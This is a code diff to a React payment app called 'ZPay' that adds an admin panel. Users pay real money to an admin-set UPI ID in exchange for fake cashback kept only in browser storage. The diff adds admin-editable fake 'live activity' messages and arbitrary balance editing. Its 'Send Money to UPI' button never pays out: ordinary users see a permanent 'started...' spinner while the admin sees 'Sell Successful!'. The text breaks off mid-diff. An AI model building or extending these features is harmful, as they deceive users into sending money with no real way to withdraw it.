@@ -18,6 +18,7 @@ import {
   Plus,
   QrCode,
   Send,
+  Shield,
   ShoppingCart,
   Trash2,
   TrendingUp,
@@ -33,7 +34,7 @@ import LoginScreen, { type UserProfile } from "./components/LoginScreen";
 
 // ─── Types ───────────────────────────────────────────────────────────────────
 type ModalType = "usdt" | "activity" | "help" | "chat" | "pin" | null;
-type ActiveTab = "home" | "payment" | "tools" | "team" | "my";
+type ActiveTab = "home" | "payment" | "tools" | "team" | "my" | "admin";
 
 interface ChatMessage {
   id: number;
@@ -80,7 +81,10 @@ function genOrderId(): string {
 
 function genOrders(count: number): Order[] {
   return Array.from({ length: count }, () => {
-    const amount = Math.floor(Math.random() * 801) + 200;
+    const amount =
+      Math.random() < 0.6
+        ? Math.floor(Math.random() * 201) + 200
+        : Math.floor(Math.random() * 601) + 400;
     const category: Order["category"] =
       amount <= 400 ? "200-400" : amount <= 600 ? "401-600" : "601-1000";
     return {
@@ -222,7 +226,7 @@ function BonusPopup({ onClose }: { onClose: () => void }) {
           className="text-4xl font-bold mb-2"
           style={{ color: "oklch(0.62 0.18 80)" }}
         >
-          +₹{BONUS_AMOUNT}
+          +₹{Number(localStorage.getItem("zpay_admin_bonus") || BONUS_AMOUNT)}
         </div>
         <p className="text-sm text-muted-foreground mb-5">
           Welcome bonus has been added to your account!
@@ -808,7 +812,7 @@ function ClaimPage({
   onComplete: (po: ProcessingOrder) => void;
   onClose: () => void;
 }) {
-  const TOTAL_SECS = 29 * 60;
+  const TOTAL_SECS = 5 * 60;
   const [secsLeft, setSecsLeft] = useState(TOTAL_SECS);
   const [copiedUpi, setCopiedUpi] = useState(false);
   const [completed, setCompleted] = useState(false);
@@ -820,7 +824,8 @@ function ClaimPage({
     null,
   );
   const fileInputRef = useRef<HTMLInputElement>(null);
-  const UPI_ID = "pubgopop@freecharge";
+  const UPI_ID =
+    localStorage.getItem("zpay_admin_upi") || "pubgopop@freecharge";
 
   useEffect(() => {
     if (secsLeft <= 0) return;
@@ -859,13 +864,16 @@ function ClaimPage({
     setTimeout(() => {
       setCompleted(true);
       setLoading(false);
-      const income = Math.round((order.amount * CASHBACK_PCT) / 100);
+      const cashbackPct = Number(
+        localStorage.getItem("zpay_admin_cashback") || CASHBACK_PCT,
+      );
+      const income = Math.round((order.amount * cashbackPct) / 100);
       onComplete({
         orderId: order.orderId,
         amount: order.amount,
         income,
         timestamp: new Date().toLocaleString("en-IN"),
-        completesAt: Date.now() + 30 * 60 * 1000,
+        completesAt: Date.now() + 5 * 60 * 1000,
         utrNumber: utrNumber.trim(),
         screenshotUrl: screenshotPreview ?? undefined,
         status: "processing",
@@ -1163,7 +1171,7 @@ function ClaimPage({
 
 // ─── Live Ticker (Realistic Surfing) ─────────────────────────────────────────
 function LiveTicker() {
-  const phrases = [
+  const defaultPhrases = [
     "₹847 order claimed by user",
     "₹623 order processing",
     "₹991 new order matched",
@@ -1173,6 +1181,10 @@ function LiveTicker() {
     "₹880 order matched",
     "₹320 bonus credited",
   ];
+  const storedTickers = localStorage.getItem("zpay_admin_tickers");
+  const phrases = storedTickers
+    ? (JSON.parse(storedTickers) as string[])
+    : defaultPhrases;
   const [idx, setIdx] = useState(0);
   const [visible, setVisible] = useState(true);
 
@@ -1185,7 +1197,7 @@ function LiveTicker() {
       }, 300);
     }, 2500);
     return () => clearInterval(t);
-  }, []);
+  }, [phrases.length]);
 
   return (
     <div
@@ -1237,7 +1249,10 @@ function HomeTab({
         const replaceCount = Math.floor(Math.random() * 5) + 2;
         for (let i = 0; i < replaceCount; i++) {
           const idx = Math.floor(Math.random() * next.length);
-          const amount = Math.floor(Math.random() * 801) + 200;
+          const amount =
+            Math.random() < 0.6
+              ? Math.floor(Math.random() * 201) + 200
+              : Math.floor(Math.random() * 601) + 400;
           const category: Order["category"] =
             amount <= 400 ? "200-400" : amount <= 600 ? "401-600" : "601-1000";
           next[idx] = {
@@ -1492,6 +1507,7 @@ function MyScreen({
   onLogout,
   profile,
   balance,
+  totalDeposit,
   setActiveTab,
 }: {
   sellOn: boolean;
@@ -1500,6 +1516,7 @@ function MyScreen({
   onLogout: () => void;
   profile: UserProfile | null;
   balance: number;
+  totalDeposit: number;
   setActiveTab: (t: ActiveTab) => void;
 }) {
   const userId = profile?.phone ? `ZP${profile.phone.slice(-6)}` : "2250586";
@@ -1598,6 +1615,9 @@ function MyScreen({
             minimumFractionDigits: 2,
             maximumFractionDigits: 2,
           })}
+        </p>
+        <p className="text-white/70 text-xs mt-1">
+          Total Deposit: ₹{totalDeposit.toLocaleString("en-IN")}
         </p>
         <div className="mt-3 flex items-center gap-2">
           <span className="text-white/60 text-xs">User ID:</span>
@@ -1950,17 +1970,32 @@ function PaymentTab({
   setSellOn,
   balance,
   upiList,
+  completedOrders,
+  processingOrders,
+  isAdmin,
+  phone,
 }: {
   sellOn: boolean;
   setSellOn: (v: boolean) => void;
   balance: number;
   upiList: UpiEntry[];
+  completedOrders: ProcessingOrder[];
+  processingOrders: ProcessingOrder[];
+  isAdmin: boolean;
+  phone: string;
 }) {
+  const [upiSending, setUpiSending] = useState<Set<string>>(() => {
+    try {
+      const stored = localStorage.getItem(`zpay_upi_sending_${phone}`);
+      return stored ? new Set(JSON.parse(stored)) : new Set();
+    } catch {
+      return new Set();
+    }
+  });
   const [sellMessage, setSellMessage] = useState<"success" | "low" | null>(
     null,
   );
   const [loading, setLoading] = useState(false);
-
   const handleToggle = (checked: boolean) => {
     setLoading(true);
     setTimeout(() => {
@@ -1980,6 +2015,12 @@ function PaymentTab({
   };
 
   const boundUpi = upiList[0]?.upiId || null;
+
+  const [_tick, setTick] = useState(0);
+  useEffect(() => {
+    const interval = setInterval(() => setTick((t) => t + 1), 10000);
+    return () => clearInterval(interval);
+  }, []);
 
   return (
     <div className="flex-1 overflow-y-auto pb-24" data-ocid="payment.tab">
@@ -2167,6 +2208,768 @@ function PaymentTab({
           </AnimatePresence>
         </div>
       </div>
+
+      {/* Active Selling Orders */}
+      {processingOrders.filter((o) => o.status === "processing").length > 0 && (
+        <div className="mx-4 mt-4">
+          <p className="text-xs text-muted-foreground uppercase tracking-wider font-semibold mb-3">
+            Active Selling Orders
+          </p>
+          <div className="space-y-2">
+            {processingOrders
+              .filter(
+                (o) => o.status === "processing" && Date.now() < o.completesAt,
+              )
+              .map((o, i) => {
+                const secsLeft = Math.max(
+                  0,
+                  Math.floor((o.completesAt - Date.now()) / 1000),
+                );
+                const mm = Math.floor(secsLeft / 60);
+                const ss = secsLeft % 60;
+                return (
+                  <div
+                    key={o.orderId}
+                    className="p-3 rounded-2xl flex items-center justify-between"
+                    style={{
+                      background: "rgba(255,255,255,0.7)",
+                      backdropFilter: "blur(12px)",
+                      WebkitBackdropFilter: "blur(12px)",
+                      border: "1px solid rgba(245,158,11,0.25)",
+                      boxShadow: "0 2px 10px rgba(0,0,0,0.04)",
+                    }}
+                    data-ocid={`payment.selling.item.${i + 1}`}
+                  >
+                    <div className="flex items-center gap-2">
+                      <span
+                        className="px-2 py-0.5 rounded-full text-[10px] font-bold"
+                        style={{
+                          background: "rgba(245,158,11,0.15)",
+                          color: "oklch(0.55 0.18 70)",
+                        }}
+                      >
+                        Selling
+                      </span>
+                      <div>
+                        <p className="text-xs font-bold text-foreground">
+                          #{o.orderId}
+                        </p>
+                        <p className="text-[10px] text-muted-foreground">
+                          ₹{o.amount.toLocaleString("en-IN")}
+                        </p>
+                      </div>
+                    </div>
+                    <p
+                      className="text-xs font-mono font-bold"
+                      style={{ color: "oklch(0.55 0.18 70)" }}
+                    >
+                      {mm}:{ss.toString().padStart(2, "0")}
+                    </p>
+                  </div>
+                );
+              })}
+            {upiList.length > 0 &&
+              processingOrders
+                .filter(
+                  (o) =>
+                    o.status === "processing" && Date.now() >= o.completesAt,
+                )
+                .map((o, i) => (
+                  <div
+                    key={o.orderId}
+                    className="p-3 rounded-2xl flex items-center justify-between"
+                    style={{
+                      background: "rgba(255,255,255,0.7)",
+                      backdropFilter: "blur(12px)",
+                      WebkitBackdropFilter: "blur(12px)",
+                      border: "1px solid rgba(99,102,241,0.25)",
+                      boxShadow: "0 2px 10px rgba(0,0,0,0.04)",
+                    }}
+                    data-ocid={`payment.selling_upi.item.${i + 1}`}
+                  >
+                    <div className="flex items-center gap-2">
+                      <span
+                        className="px-2 py-0.5 rounded-full text-[10px] font-bold"
+                        style={{
+                          background: "rgba(99,102,241,0.12)",
+                          color: "oklch(0.45 0.18 265)",
+                        }}
+                      >
+                        Selling in Progress to UPI
+                      </span>
+                      <div>
+                        <p className="text-xs font-bold text-foreground">
+                          #{o.orderId}
+                        </p>
+                        <p className="text-[10px] text-muted-foreground">
+                          ₹{o.amount.toLocaleString("en-IN")}
+                        </p>
+                      </div>
+                    </div>
+                    <p className="text-[10px] text-muted-foreground">
+                      {upiList[0].upiId}
+                    </p>
+                  </div>
+                ))}
+          </div>
+        </div>
+      )}
+
+      {/* Order Complete */}
+      {completedOrders.length > 0 && (
+        <div className="mx-4 mt-4">
+          <p className="text-xs text-muted-foreground uppercase tracking-wider font-semibold mb-3">
+            Order Complete
+          </p>
+          <div className="space-y-2">
+            {completedOrders.slice(0, 5).map((o, i) => (
+              <div
+                key={o.orderId}
+                className="p-3 rounded-xl flex items-center justify-between"
+                style={{
+                  background: "rgba(34,197,94,0.06)",
+                  border: "1px solid rgba(34,197,94,0.18)",
+                }}
+                data-ocid={`payment.complete.${i + 1}`}
+              >
+                <div className="flex items-center gap-2">
+                  <CheckCircle
+                    size={16}
+                    className="text-zpay-green flex-shrink-0"
+                  />
+                  <div>
+                    <p className="text-xs font-bold text-foreground">
+                      Order #{o.orderId}
+                    </p>
+                    <p className="text-[10px] text-muted-foreground">
+                      {o.timestamp}
+                    </p>
+                  </div>
+                </div>
+                <div className="text-right">
+                  <p className="text-sm font-bold text-zpay-green">
+                    +₹{(o.amount + o.income).toLocaleString("en-IN")}
+                  </p>
+                  <p className="text-[10px] text-muted-foreground">
+                    ₹{o.amount} + {o.income} bonus
+                  </p>
+                </div>
+              </div>
+            ))}
+          </div>
+        </div>
+      )}
+
+      {/* Sell Deposits */}
+      <div className="mx-4 mt-4 pb-4">
+        <p className="text-xs text-muted-foreground uppercase tracking-wider font-semibold mb-3">
+          Sell Deposits
+        </p>
+        {completedOrders.length === 0 ? (
+          <div
+            className="p-4 rounded-xl text-center"
+            style={{
+              background: "rgba(255,255,255,0.7)",
+              backdropFilter: "blur(8px)",
+              WebkitBackdropFilter: "blur(8px)",
+              border: "1px solid rgba(0,0,0,0.06)",
+            }}
+            data-ocid="payment.empty_state"
+          >
+            <p className="text-sm text-muted-foreground">
+              No completed deposits yet
+            </p>
+          </div>
+        ) : (
+          <div className="space-y-3" data-ocid="payment.list">
+            {completedOrders.map((o, i) => (
+              <div
+                key={o.orderId}
+                className="p-3 rounded-xl flex items-center justify-between"
+                style={{
+                  background: "rgba(255,255,255,0.7)",
+                  backdropFilter: "blur(8px)",
+                  WebkitBackdropFilter: "blur(8px)",
+                  border: "1px solid rgba(34,197,94,0.2)",
+                  boxShadow: "0 2px 8px rgba(0,0,0,0.04)",
+                }}
+                data-ocid={`payment.item.${i + 1}`}
+              >
+                <div>
+                  <p className="text-xs font-mono text-muted-foreground">
+                    {o.orderId}
+                  </p>
+                  <p className="text-sm font-bold text-foreground">
+                    ₹{o.amount.toLocaleString("en-IN")}
+                  </p>
+                  <p className="text-xs text-zpay-green">
+                    +₹{o.income.toLocaleString("en-IN")} cashback
+                  </p>
+                  <p className="text-[10px] text-muted-foreground mt-0.5">
+                    {o.timestamp}
+                  </p>
+                </div>
+                {upiSending.has(o.orderId) ? (
+                  isAdmin ? (
+                    <div className="flex flex-col items-center gap-1">
+                      <svg
+                        role="img"
+                        aria-label="Success"
+                        xmlns="http://www.w3.org/2000/svg"
+                        className="h-4 w-4 text-green-600"
+                        viewBox="0 0 20 20"
+                        fill="currentColor"
+                      >
+                        <path
+                          fillRule="evenodd"
+                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
+                          clipRule="evenodd"
+                        />
+                      </svg>
+                      <span className="text-[9px] text-green-600 font-bold text-center">
+                        Sell Successful!
+                      </span>
+                    </div>
+                  ) : (
+                    <div className="flex flex-col items-center gap-1">
+                      <svg
+                        role="img"
+                        aria-label="Loading"
+                        className="animate-spin h-4 w-4 text-green-600"
+                        xmlns="http://www.w3.org/2000/svg"
+                        fill="none"
+                        viewBox="0 0 24 24"
+                      >
+                        <circle
+                          className="opacity-25"
+                          cx="12"
+                          cy="12"
+                          r="10"
+                          stroke="currentColor"
+                          strokeWidth="4"
+                        />
+                        <path
+                          className="opacity-75"
+                          fill="currentColor"
+                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"
+                        />
+                      </svg>
+                      <span className="text-[9px] text-green-600 font-semibold text-center">
+                        Selling to UPI
+                        <br />
+                        started...
+                      </span>
+                    </div>
+                  )
+                ) : (
+                  <button
+                    type="button"
+                    onClick={() =>
+                      setUpiSending((prev) => {
+                        const next = new Set([...prev, o.orderId]);
+                        try {
+                          localStorage.setItem(
+                            `zpay_upi_sending_${phone}`,
+                            JSON.stringify([...next]),
+                          );
+                        } catch {}
+                        return next;
+                      })
+                    }
+                    className="text-[10px] px-2 py-1 rounded-full bg-green-500 text-white font-semibold border border-green-600 hover:bg-green-600 transition-colors"
+                  >
+                    Send Money to UPI
+                  </button>
+                )}
+              </div>
+            ))}
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+// ─── Admin Tab ────────────────────────────────────────────────────────────────
+function AdminTab({ onLogout }: { onLogout: () => void }) {
+  const [users, setUsers] = useState<
+    { phone: string; name: string; balance: number }[]
+  >([]);
+  const [editingPhone, setEditingPhone] = useState<string | null>(null);
+  const [editBalance, setEditBalance] = useState("");
+  const [processingAll, setProcessingAll] = useState<
+    { phone: string; orders: ProcessingOrder[] }[]
+  >([]);
+
+  const loadProcessingOrders = () => {
+    const result: { phone: string; orders: ProcessingOrder[] }[] = [];
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      if (key?.startsWith("zpay_processing_")) {
+        const phone = key.replace("zpay_processing_", "");
+        try {
+          const orders: ProcessingOrder[] = JSON.parse(
+            localStorage.getItem(key) || "[]",
+          );
+          const active = orders.filter((o) => o.status === "processing");
+          if (active.length > 0) result.push({ phone, orders: active });
+        } catch {
+          /* skip */
+        }
+      }
+    }
+    setProcessingAll(result);
+  };
+
+  const handleInstantComplete = (phone: string, orderId: string) => {
+    const procKey = `zpay_processing_${phone}`;
+    const compKey = `zpay_completed_${phone}`;
+    const balKey = `zpay_balance_${phone}`;
+    const depKey = `zpay_totaldeposit_${phone}`;
+
+    const procOrders: ProcessingOrder[] = JSON.parse(
+      localStorage.getItem(procKey) || "[]",
+    );
+    const order = procOrders.find((o) => o.orderId === orderId);
+    if (!order) return;
+
+    // Update balance: amount + income
+    const currentBal = Number(localStorage.getItem(balKey) || 0);
+    const newBal = currentBal + order.amount + order.income;
+    localStorage.setItem(balKey, String(newBal));
+
+    // Update total deposit
+    const currentDep = Number(localStorage.getItem(depKey) || 0);
+    localStorage.setItem(depKey, String(currentDep + order.amount));
+
+    // Move to completed
+    const completedOrder = { ...order, status: "completed" as const };
+    const compOrders: ProcessingOrder[] = JSON.parse(
+      localStorage.getItem(compKey) || "[]",
+    );
+    localStorage.setItem(
+      compKey,
+      JSON.stringify([completedOrder, ...compOrders]),
+    );
+
+    // Remove from processing
+    const remaining = procOrders.filter((o) => o.orderId !== orderId);
+    localStorage.setItem(procKey, JSON.stringify(remaining));
+
+    // Update user list balance
+    setUsers((prev) =>
+      prev.map((u) => (u.phone === phone ? { ...u, balance: newBal } : u)),
+    );
+    loadProcessingOrders();
+  };
+
+  // App settings
+  const [upiSetting, setUpiSetting] = useState(
+    () => localStorage.getItem("zpay_admin_upi") || "pubgopop@freecharge",
+  );
+  const [cashbackSetting, setCashbackSetting] = useState(
+    () => localStorage.getItem("zpay_admin_cashback") || "9",
+  );
+  const [bonusSetting, setBonusSetting] = useState(
+    () => localStorage.getItem("zpay_admin_bonus") || "180",
+  );
+  const [tickersSetting, setTickersSetting] = useState(() => {
+    const stored = localStorage.getItem("zpay_admin_tickers");
+    return (
+      stored ||
+      JSON.stringify([
+        "₹847 order claimed by user",
+        "₹623 order processing",
+        "₹412 cashback added",
+      ])
+    );
+  });
+  const [settingsSaved, setSettingsSaved] = useState(false);
+
+  useEffect(() => {
+    const loadedUsers: { phone: string; name: string; balance: number }[] = [];
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      if (key?.startsWith("zpay_user_")) {
+        const phone = key.replace("zpay_user_", "");
+        if (phone === "admin") continue;
+        try {
+          const profile = JSON.parse(localStorage.getItem(key) || "{}");
+          const bal = Number(
+            localStorage.getItem(`zpay_balance_${phone}`) || 0,
+          );
+          loadedUsers.push({
+            phone,
+            name: profile.name || phone,
+            balance: bal,
+          });
+        } catch {
+          /* skip */
+        }
+      }
+    }
+    setUsers(loadedUsers);
+    // inline load processing orders
+    const procResult2: { phone: string; orders: ProcessingOrder[] }[] = [];
+    for (let j = 0; j < localStorage.length; j++) {
+      const pkey = localStorage.key(j);
+      if (pkey?.startsWith("zpay_processing_")) {
+        const pphone = pkey.replace("zpay_processing_", "");
+        try {
+          const porders: ProcessingOrder[] = JSON.parse(
+            localStorage.getItem(pkey) || "[]",
+          );
+          const active = porders.filter((o) => o.status === "processing");
+          if (active.length > 0)
+            procResult2.push({ phone: pphone, orders: active });
+        } catch {
+          /* skip */
+        }
+      }
+    }
+    setProcessingAll(procResult2);
+  }, []);
+
+  const handleSaveBalance = (phone: string) => {
+    const newBal = Number(editBalance);
+    if (Number.isNaN(newBal)) return;
+    localStorage.setItem(`zpay_balance_${phone}`, String(newBal));
+    setUsers((prev) =>
+      prev.map((u) => (u.phone === phone ? { ...u, balance: newBal } : u)),
+    );
+    setEditingPhone(null);
+    setEditBalance("");
+  };
+
+  const handleClearOrders = (phone: string) => {
+    localStorage.removeItem(`zpay_processing_${phone}`);
+    localStorage.removeItem(`zpay_completed_${phone}`);
+  };
+
+  const handleSaveSettings = () => {
+    localStorage.setItem("zpay_admin_upi", upiSetting);
+    localStorage.setItem("zpay_admin_cashback", cashbackSetting);
+    localStorage.setItem("zpay_admin_bonus", bonusSetting);
+    try {
+      JSON.parse(tickersSetting);
+      localStorage.setItem("zpay_admin_tickers", tickersSetting);
+    } catch {
+      /* invalid JSON, skip */
+    }
+    setSettingsSaved(true);
+    setTimeout(() => setSettingsSaved(false), 2000);
+  };
+
+  const goldBorder = { border: "1px solid oklch(0.62 0.18 80 / 0.3)" };
+  const cardStyle = {
+    background: "rgba(255,255,255,0.9)",
+    ...goldBorder,
+    borderRadius: 16,
+    boxShadow: "0 2px 12px rgba(0,0,0,0.06)",
+  };
+
+  return (
+    <div className="flex-1 overflow-y-auto pb-24" data-ocid="admin.tab">
+      <div
+        className="px-4 pt-10 pb-4 flex items-center gap-3"
+        style={{
+          background:
+            "linear-gradient(135deg, oklch(0.62 0.18 80 / 0.08), transparent)",
+          borderBottom: "1px solid oklch(0.62 0.18 80 / 0.15)",
+        }}
+      >
+        <Shield size={22} style={{ color: "oklch(0.62 0.18 80)" }} />
+        <h1 className="text-xl font-bold text-foreground">Admin Panel</h1>
+      </div>
+
+      {/* User Management */}
+      <div className="mx-4 mt-4">
+        <p
+          className="text-xs uppercase tracking-wider font-bold mb-3"
+          style={{ color: "oklch(0.62 0.18 80)" }}
+        >
+          User Management
+        </p>
+        {users.length === 0 ? (
+          <div
+            className="p-4 rounded-2xl text-center"
+            style={cardStyle}
+            data-ocid="admin.empty_state"
+          >
+            <p className="text-sm text-muted-foreground">
+              No registered users found
+            </p>
+          </div>
+        ) : (
+          <div className="space-y-3">
+            {users.map((u, i) => (
+              <div
+                key={u.phone}
+                className="p-4 rounded-2xl"
+                style={cardStyle}
+                data-ocid={`admin.item.${i + 1}`}
+              >
+                <div className="flex items-center justify-between mb-2">
+                  <div>
+                    <p className="text-sm font-bold text-foreground">
+                      {u.name}
+                    </p>
+                    <p className="text-xs text-muted-foreground">{u.phone}</p>
+                  </div>
+                  <div className="text-right">
+                    <p
+                      className="text-sm font-bold"
+                      style={{ color: "oklch(0.62 0.18 80)" }}
+                    >
+                      ₹{u.balance.toLocaleString("en-IN")}
+                    </p>
+                    <p className="text-[10px] text-muted-foreground">Balance</p>
+                  </div>
+                </div>
+
+                {editingPhone === u.phone ? (
+                  <div className="flex gap-2 mt-2">
+                    <input
+                      type="number"
+                      value={editBalance}
+                      onChange={(e) => setEditBalance(e.target.value)}
+                      placeholder="New balance"
+                      className="flex-1 px-3 py-2 rounded-lg border border-border bg-secondary text-sm outline-none"
+                      data-ocid="admin.input"
+                    />
+                    <button
+                      type="button"
+                      onClick={() => handleSaveBalance(u.phone)}
+                      className="px-3 py-2 rounded-lg text-xs font-bold text-white"
+                      style={{ background: "oklch(0.62 0.18 80)" }}
+                      data-ocid="admin.save_button"
+                    >
+                      Save
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => setEditingPhone(null)}
+                      className="px-3 py-2 rounded-lg text-xs font-bold bg-secondary border border-border text-muted-foreground"
+                      data-ocid="admin.cancel_button"
+                    >
+                      Cancel
+                    </button>
+                  </div>
+                ) : (
+                  <div className="flex gap-2 mt-2">
+                    <button
+                      type="button"
+                      onClick={() => {
+                        setEditingPhone(u.phone);
+                        setEditBalance(String(u.balance));
+                      }}
+                      className="flex-1 py-1.5 rounded-lg text-xs font-semibold border"
+                      style={{
+                        borderColor: "oklch(0.62 0.18 80 / 0.4)",
+                        color: "oklch(0.62 0.18 80)",
+                      }}
+                      data-ocid="admin.edit_button"
+                    >
+                      Edit Balance
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => handleClearOrders(u.phone)}
+                      className="flex-1 py-1.5 rounded-lg text-xs font-semibold bg-red-50 border border-red-200 text-red-600"
+                      data-ocid="admin.delete_button"
+                    >
+                      Clear Orders
+                    </button>
+                  </div>
+                )}
+              </div>
+            ))}
+          </div>
+        )}
+      </div>
+
+      {/* App Settings */}
+      <div className="mx-4 mt-6">
+        <p
+          className="text-xs uppercase tracking-wider font-bold mb-3"
+          style={{ color: "oklch(0.62 0.18 80)" }}
+        >
+          App Settings
+        </p>
+        <div className="p-4 rounded-2xl space-y-4" style={cardStyle}>
+          <div>
+            <label
+              htmlFor="admin-upi"
+              className="block text-xs font-semibold text-foreground mb-1.5"
+            >
+              UPI ID
+            </label>
+            <input
+              id="admin-upi"
+              type="text"
+              value={upiSetting}
+              onChange={(e) => setUpiSetting(e.target.value)}
+              className="w-full px-3 py-2.5 rounded-lg border border-border bg-secondary text-sm outline-none focus:border-yellow-400 transition-colors"
+              data-ocid="admin.input"
+            />
+          </div>
+          <div>
+            <label
+              htmlFor="admin-cashback"
+              className="block text-xs font-semibold text-foreground mb-1.5"
+            >
+              Cashback % (default 9)
+            </label>
+            <input
+              id="admin-cashback"
+              type="number"
+              value={cashbackSetting}
+              onChange={(e) => setCashbackSetting(e.target.value)}
+              className="w-full px-3 py-2.5 rounded-lg border border-border bg-secondary text-sm outline-none focus:border-yellow-400 transition-colors"
+              data-ocid="admin.input"
+            />
+          </div>
+          <div>
+            <label
+              htmlFor="admin-bonus"
+              className="block text-xs font-semibold text-foreground mb-1.5"
+            >
+              Sign-up Bonus ₹ (default 180)
+            </label>
+            <input
+              id="admin-bonus"
+              type="number"
+              value={bonusSetting}
+              onChange={(e) => setBonusSetting(e.target.value)}
+              className="w-full px-3 py-2.5 rounded-lg border border-border bg-secondary text-sm outline-none focus:border-yellow-400 transition-colors"
+              data-ocid="admin.input"
+            />
+          </div>
+          <div>
+            <label
+              htmlFor="admin-tickers"
+              className="block text-xs font-semibold text-foreground mb-1.5"
+            >
+              Live Ticker Messages (JSON array)
+            </label>
+            <textarea
+              id="admin-tickers"
+              value={tickersSetting}
+              onChange={(e) => setTickersSetting(e.target.value)}
+              rows={4}
+              className="w-full px-3 py-2.5 rounded-lg border border-border bg-secondary text-sm outline-none focus:border-yellow-400 transition-colors font-mono resize-none"
+              data-ocid="admin.textarea"
+            />
+          </div>
+          <button
+            type="button"
+            onClick={handleSaveSettings}
+            className="w-full py-3 rounded-xl font-bold text-sm text-white transition-all active:scale-[0.98]"
+            style={{
+              background:
+                "linear-gradient(135deg, oklch(0.78 0.18 82), oklch(0.68 0.20 68))",
+            }}
+            data-ocid="admin.submit_button"
+          >
+            {settingsSaved ? "✓ Saved!" : "Save Settings"}
+          </button>
+        </div>
+      </div>
+
+      {/* Order Management */}
+      <div className="mx-4 mt-6">
+        <div className="flex items-center justify-between mb-3">
+          <p
+            className="text-xs uppercase tracking-wider font-bold"
+            style={{ color: "oklch(0.62 0.18 80)" }}
+          >
+            Processing Orders
+          </p>
+          <button
+            type="button"
+            onClick={loadProcessingOrders}
+            className="text-xs px-3 py-1 rounded-lg border font-semibold"
+            style={{
+              borderColor: "oklch(0.62 0.18 80 / 0.4)",
+              color: "oklch(0.62 0.18 80)",
+            }}
+          >
+            Refresh
+          </button>
+        </div>
+        {processingAll.length === 0 ? (
+          <div
+            className="p-4 rounded-2xl text-center"
+            style={{
+              background: "rgba(255,255,255,0.9)",
+              border: "1px solid rgba(0,0,0,0.06)",
+              borderRadius: 16,
+            }}
+          >
+            <p className="text-sm text-muted-foreground">
+              No processing orders
+            </p>
+          </div>
+        ) : (
+          <div className="space-y-3">
+            {processingAll.map(({ phone, orders }) =>
+              orders.map((order, i) => (
+                <div
+                  key={`${order.orderId}-${phone}`}
+                  className="p-4 rounded-2xl"
+                  style={{
+                    background: "rgba(255,255,255,0.9)",
+                    border: "1px solid rgba(0,0,0,0.06)",
+                    borderRadius: 16,
+                  }}
+                  data-ocid={`admin.order.${i + 1}`}
+                >
+                  <div className="flex items-center justify-between mb-2">
+                    <div>
+                      <p className="text-xs font-bold text-foreground">
+                        #{order.orderId}
+                      </p>
+                      <p className="text-[10px] text-muted-foreground">
+                        {phone}
+                      </p>
+                    </div>
+                    <p
+                      className="text-sm font-bold"
+                      style={{ color: "oklch(0.62 0.18 80)" }}
+                    >
+                      ₹{order.amount} + ₹{order.income}
+                    </p>
+                  </div>
+                  <button
+                    type="button"
+                    onClick={() => handleInstantComplete(phone, order.orderId)}
+                    className="w-full py-2 rounded-xl text-xs font-bold text-white"
+                    style={{
+                      background:
+                        "linear-gradient(135deg, oklch(0.50 0.20 145), oklch(0.45 0.18 145))",
+                    }}
+                    data-ocid="admin.complete_order_button"
+                  >
+                    Complete Instantly
+                  </button>
+                </div>
+              )),
+            )}
+          </div>
+        )}
+      </div>
+
+      {/* Logout */}
+      <div className="mx-4 mt-6 mb-6">
+        <button
+          type="button"
+          onClick={onLogout}
+          className="w-full py-3 rounded-xl bg-secondary border border-border text-muted-foreground font-semibold text-sm flex items-center justify-center gap-2"
+          data-ocid="logout.button"
+        >
+          <LogOut size={16} /> Log Out
+        </button>
+      </div>
     </div>
   );
 }
@@ -2203,6 +3006,20 @@ export default function App() {
       return stored ? JSON.parse(stored) : [];
     },
   );
+  const [completedOrders, setCompletedOrders] = useState<ProcessingOrder[]>(
+    () => {
+      const phone = localStorage.getItem("zpay_auth");
+      if (!phone) return [];
+      const stored = localStorage.getItem(`zpay_completed_${phone}`);
+      return stored ? JSON.parse(stored) : [];
+    },
+  );
+  const [totalDeposit, setTotalDeposit] = useState<number>(() => {
+    const phone = localStorage.getItem("zpay_auth");
+    if (!phone) return 0;
+    const stored = localStorage.getItem(`zpay_totaldeposit_${phone}`);
+    return stored ? Number(stored) : 0;
+  });
   const [tabLoading, setTabLoading] = useState(false);
 
   // Splash screen for 0.5 seconds
@@ -2221,8 +3038,9 @@ export default function App() {
         );
         if (toComplete.length === 0) return prev;
         const totalIncome = toComplete.reduce((sum, o) => sum + o.income, 0);
+        const totalAmount = toComplete.reduce((sum, o) => sum + o.amount, 0);
         setBalance((b) => {
-          const newBalance = b + totalIncome;
+          const newBalance = b + totalAmount + totalIncome;
           if (userProfile?.phone) {
             localStorage.setItem(
               `zpay_balance_${userProfile.phone}`,
@@ -2231,9 +3049,40 @@ export default function App() {
           }
           return newBalance;
         });
-        return prev.filter(
+        setTotalDeposit((td) => {
+          const newTotalDeposit = td + totalAmount;
+          if (userProfile?.phone) {
+            localStorage.setItem(
+              `zpay_totaldeposit_${userProfile.phone}`,
+              String(newTotalDeposit),
+            );
+          }
+          return newTotalDeposit;
+        });
+        const completedItems = toComplete.map((o) => ({
+          ...o,
+          status: "completed" as const,
+        }));
+        setCompletedOrders((prev2) => {
+          const updated = [...completedItems, ...prev2];
+          if (userProfile?.phone) {
+            localStorage.setItem(
+              `zpay_completed_${userProfile.phone}`,
+              JSON.stringify(updated),
+            );
+          }
+          return updated;
+        });
+        const remaining = prev.filter(
           (o) => !(o.status === "processing" && o.completesAt <= now),
         );
+        if (userProfile?.phone) {
+          localStorage.setItem(
+            `zpay_processing_${userProfile.phone}`,
+            JSON.stringify(remaining),
+          );
+        }
+        return remaining;
       });
     }, 1000);
     return () => clearInterval(t);
@@ -2247,6 +3096,8 @@ export default function App() {
     setUserProfile(null);
     setBalance(0);
     setProcessingOrders([]);
+    setCompletedOrders([]);
+    setTotalDeposit(0);
   };
 
   const handleAuth = (profile: UserProfile, _isNewUser: boolean) => {
@@ -2259,7 +3110,10 @@ export default function App() {
     const bonusKey = `zpay_bonus_given_${profile.phone}`;
     const bonusAlreadyGiven = localStorage.getItem(bonusKey);
     if (!bonusAlreadyGiven) {
-      currentBalance += BONUS_AMOUNT;
